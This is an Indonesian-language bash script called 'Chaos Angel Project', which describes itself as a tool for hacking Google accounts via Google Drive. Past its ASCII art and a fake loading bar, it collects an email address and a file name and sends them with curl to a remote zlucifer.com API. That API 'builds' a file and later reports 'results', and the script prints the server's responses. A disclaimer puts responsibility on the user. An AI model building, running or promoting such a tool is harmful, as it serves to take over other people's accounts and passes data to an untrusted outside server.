#!/bin/bash
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////
#////                       _            _  __                              ////
#////                      | |          (_)/ _|                             ////
#////                   ___| |_   _  ___ _| |_ ___ _ __                     ////
#////                  |_  / | | | |/ __| |  _/ _ \ '__|                    ////
#////                   / /| | |_| | (__| | ||  __/ |                       ////
#////                  /___|_|\__,_|\___|_|_| \___|_|                       ////
#////                                                                       ////
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////
#PERINGATAN : KESALAHAN ATAU KEJAHATAN ADALAH TANGGUNG JAWAB DARI PEMAKAI
#GUNAKAN TOOLS UNTUK KEBAIKAN JANGAN DISALAH GUNAKAN :)
chaos(){
      echo "           .-----. "
      sleep 0.03
      echo " \ ' /   _/    )/ "
      sleep 0.03
      echo "- ( ) -('---''--) "
      sleep 0.03
      echo " / . \((()\^_^/)() "
      sleep 0.03
      echo "  \\_\ (()_)-((()() "
      sleep 0.03
      echo "   '- \ )/\._./(() "
      sleep 0.03
      echo "     '/\/( X   ) \ "
      sleep 0.03
      echo "     (___)|___/ ) \ "
      sleep 0.03
      echo "          |.#_|(___) "
      sleep 0.03
      echo "         /\    \ ( (_ "
      sleep 0.03
      echo "         \/\/\/\) \\ "
      sleep 0.03
      echo "         | / \ | "
      sleep 0.03
      echo "         |(   \| "
      sleep 0.03
      echo "        _|_)__|_\_ "
      sleep 0.03
      echo "        )...()...( "
      sleep 0.03
      echo "         | (   \ | "
      sleep 0.03
      echo "      .-'__,)  (  \ "
      sleep 0.03
      echo "                '\_-, "
      echo "================================"
      echo "      Chaos Angel Project"
      echo "================================"
}
get_chaos_angel="http://zlucifer.com/api/hackbae.php?request=chaos"
mulai(){
      echo "Gunakan Chaos Angel Project lagi?"
      echo "y/n?"
      read lagi
      if [ $lagi = "y" ];then
          clear
          chaos
          start_chaos_angel
      else
          echo "Terimakasih sudah menggunakan Chaos Angel Project"
          exit
      fi
}
start_chaos_angel(){
      echo "[1] Buat File"
      echo "[2] Cek Hasil"
      echo "[3] Close Chaos Angel Project"
      echo "1/2/3?"
      read request
      if [ $request = "1" ]; then
          echo "Masukan email kamu"
          read email
          echo "Masukan nama file"
          read create
          echo "Apakah Email $email dan Nama file $create sudah benar?"
          echo "y/n?"
          read konfirmasi
          if [ $konfirmasi = "y" ]; then
              load
              clear
              chaos
              build=`curl -s $get_chaos_angel/build.php?create=$create"&email="$email`
              echo -e $build
          else
              echo "Kesalahan"
          fi
          mulai
      elif [ $request = "2" ]; then
          clear
          chaos
          echo "Buat file baru Google Drive"
          echo "Masukan email kamu"
          read email
          echo "Apakah Email $email sudah benar?"
          echo "y/n?"
          read konfirmasi
          if [ $konfirmasi = "y" ]; then
              load
              clear
              chaos
              search=`curl -s $get_chaos_angel/search.php?email=$email`
              echo -e $search
          else
              echo "Kesalahan"
          fi
          mulai
      elif [ $request = "3" ];then
          echo "Terimakasih sudah menggunakan Chaos Angel Project"
          exit
      else
          echo "Kesalahan"
          mulai
      fi
}
load(){
      echo -e "\n"
      bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
      barlength=${#bar}
      i=0
      while((i<100)); do
          n=$((i*barlength / 100))
          printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
          ((i += RANDOM%5+2))
          sleep 0.2
      done
}
#start
clear
echo "PERINGATAN : KESALAHAN ATAU KEJAHATAN ADALAH TANGGUNG JAWAB DARI PEMAKAI"
echo "GUNAKAN TOOLS UNTUK KEBAIKAN JANGAN DISALAH GUNAKAN :)"
echo "Lanjutkan?"
echo "y/n?"
read lanjutkan
if [ $lanjutkan = "y" ];then
    clear
    echo "Loading.."
    load
    clear
    chaos
    echo Selamat datang kak, Siapa nick kaka? #tulisan keluar
    read nick #membaca yang ditulis
    clear
    chaos
    echo "Chaos Angel adalah tools untuk"
    echo "peretasan google account via"
    echo "Google Drive"
    echo
    echo Selamat datang $nick ":)"
    echo
    start_chaos_angel
else
    echo "Powered by zLucifer"
fi
